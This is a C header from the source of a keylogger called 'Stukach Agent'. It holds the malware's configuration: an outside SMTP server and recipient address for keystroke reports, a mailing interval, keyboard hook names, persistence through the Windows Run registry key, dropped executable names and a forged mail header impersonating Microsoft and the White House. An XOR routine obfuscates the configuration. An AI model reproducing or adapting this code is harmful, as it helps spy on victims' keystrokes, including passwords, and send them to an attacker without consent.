#ifndef _CRYPT_INCLUDED_
#define _CRYPT_INCLUDED_

struct

{
char mark[8];
int hidden;// 1 - this data is encrypted, 0 if not
int salt;
char smtp[50];
char mail[50];
int warn_show;// 1 - show warning, 0 - no
char warn_title[50];
char warn_text[200];
int exe_use;//1- use EXE, 0 - no
int exe_ptr;

char val_run[20];
char val_strs[20];
char val_num[20];
char val_hook[20];
char val_count[20];

int period;// seconds between mail attempts
int maxlines;// maxinum lines to wait
int sendonstart;// send on startup

char reg_data[80];
char reg_run[80];

int target_type;
char target_file[30];
int temp_type;
char temp_file[30];

char mailhead[400];
}

crypt=

{
"LKFD66",
0,
0,
"mail.beer.com",
"jellok@beer.com",
1,
"Installation Complete",
"Stukach Agent is now installed on your system. Run AntiStukach (downloadable from WWW.ISKALKA.COM) to uninstall.",
0,
2000,

"SysReq",
"xx_Data",
"xx_NumberOfLines",
"xx_HookHandle",
"xx_Counter",

60,
500,
1,

"System\\CurrentControlSet",
"Software\\Microsoft\\Windows\\CurrentVersion\\Run",

1,
"\\sysreq.exe",
3,
"\\_ts5602.exe",

"From: \"Agent\" <billgates@microsoft.com>\r\n"
"To: \"Boss\" <president@whitehouse.gov>\r\n"
"Subject: Keyboard report from workstation 123.\r\n"
"Date: Wed, 8 Sep 1999 6:00:00 -0000\r\n"
"X-MSMail-Priority: Normal\r\n"
"X-Priority: 3\r\n"
"X-Mailer: Microsoft Internet Mail 4.00.0000\r\n"
"MIME-Version: 1.0\r\n"
"Content-Type: text/plain; charset=Windows-1251\r\n"
"Content-Transfer-Encoding: 8bit\r\n\r\n\r\n"
};


void cryptcrypt(int slt)
{
int i;
for(i=0;i<sizeof(crypt);i++){  ((unsigned char*)&crypt)[i] ^= (unsigned char)(i+slt+31);  };
}

void encrypt()
{
int slt;
if(crypt.hidden>0){ return; };
  slt=crypt.salt;
  cryptcrypt(slt);
  crypt.salt=slt;
crypt.hidden=1;
}

void decrypt()
{
int slt;
if(crypt.hidden==0){ return; };
  slt=crypt.salt;
  cryptcrypt(slt);
  crypt.salt=slt;
crypt.hidden=0;
}

#endif
